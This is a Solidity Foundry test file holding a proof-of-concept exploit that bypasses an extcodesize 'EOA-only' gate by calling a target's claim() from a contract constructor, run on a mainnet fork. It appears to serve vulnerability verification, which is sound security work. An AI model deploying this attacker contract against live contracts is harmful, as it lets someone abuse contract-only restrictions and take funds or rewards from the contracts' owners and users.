// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- extcodesize identity bypass (constructor call)
/// @notice Detector: extcodesize. The target uses extcodesize(msg.sender)
///         == 0 to "prove" the caller is an EOA and block contracts. During
///         a contract's CONSTRUCTOR its code is not deployed yet, so
///         extcodesize == 0 -- a contract calling from its constructor
///         passes the EOA check.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt claim() to the target's real
///      extcodesize-gated function.

contract ConstructorAttacker {
    // Calls the target FROM THE CONSTRUCTOR, when this contract has no
    // code yet -- extcodesize(address(this)) == 0, so the EOA gate passes.
    constructor(address victim) {
        (bool ok,) = victim.call(abi.encodeWithSignature("claim()"));
        require(ok, "bypass failed: gated call reverted from constructor");
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        // Deploying the attacker IS the exploit: its constructor call
        // goes through the EOA-only gate. If the gate held, construction
        // reverts and this test fails.
        new ConstructorAttacker(target);
        console.log("constructor call passed the extcodesize gate -- bypass proven");
    }
}
